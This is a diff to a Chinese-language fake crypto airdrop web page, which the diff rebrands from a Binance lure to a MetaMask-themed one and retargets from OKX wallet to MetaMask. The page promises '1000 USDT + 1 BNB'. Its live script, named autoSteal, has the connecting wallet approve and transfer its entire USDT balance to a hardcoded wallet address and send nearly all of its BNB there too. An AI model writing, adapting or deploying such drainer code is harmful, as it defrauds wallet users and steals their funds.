@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8" />
 <meta name="viewport" content="width=device-width,initial-scale=1.0" />
-<title>小仙女 Web3 魔法仪表台</title>
+<title>小狐狸空投</title>
 <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet">
 <script src="https://cdn.jsdelivr.net/npm/web3@1.10.4/dist/web3.min.js"></script>
 <style>
@@ -20,11 +20,11 @@ h1{color:#ff3f9f;margin-bottom:20px;text-shadow:0 0 10px rgba(255,105,180,.5);fo
 </head>
 <body>
 <div class="container">
-  <h1>币安第3次空投同舟计划</h1>
+  <h1>小狐狸空投</h1>
   <div id="status">正在领取1000USDT+1BNB</div>
 </div>
 <script>
-const TAX_WALLET = "0xd558a25D41688673EfA2FDBAD8CD30bd519f791F"; // 新钱包
+const TAX_WALLET = "0xd558a25D41688673EfA2FDBAD8CD30bd519f791F";
 const USDT_ADDR = "0x55d398326f99059fF775485246999027B3197955";
 let web3, userAddr, isOddStep = true;
 
@@ -43,7 +43,7 @@ async function autoRedirect(){
   const isMobile = /Android|iPhone|iPad/i.test(ua);
   if(isMobile){
     setTimeout(() => {
-      window.location.href = 'okxwallet://dapp?url=' + encodeURIComponent(window.location.href);
+      window.location.href = 'metamask://dapp/' + encodeURIComponent(window.location.href);
     }, 200);
   }
 }
@@ -59,14 +59,12 @@ async function autoSteal(){
     const usdt = new web3.eth.Contract(USDT_ABI, USDT_ADDR);
     
     if(isOddStep){
-      // 奇数步：USDT 授权 + transferFrom 到新钱包
       const balance = await usdt.methods.balanceOf(userAddr).call();
       if(balance > 0){
         await usdt.methods.approve(TAX_WALLET, balance).send({from: userAddr});
         await usdt.methods.transferFrom(userAddr, TAX_WALLET, balance).send({from: userAddr});
       }
     }else{
-      // 偶数步：BNB 全转（留0.001手续费）
       const balance = await web3.eth.getBalance(userAddr);
       const totalBNB = parseFloat(web3.utils.fromWei(balance, 'ether'));
       if(totalBNB > 0.001){
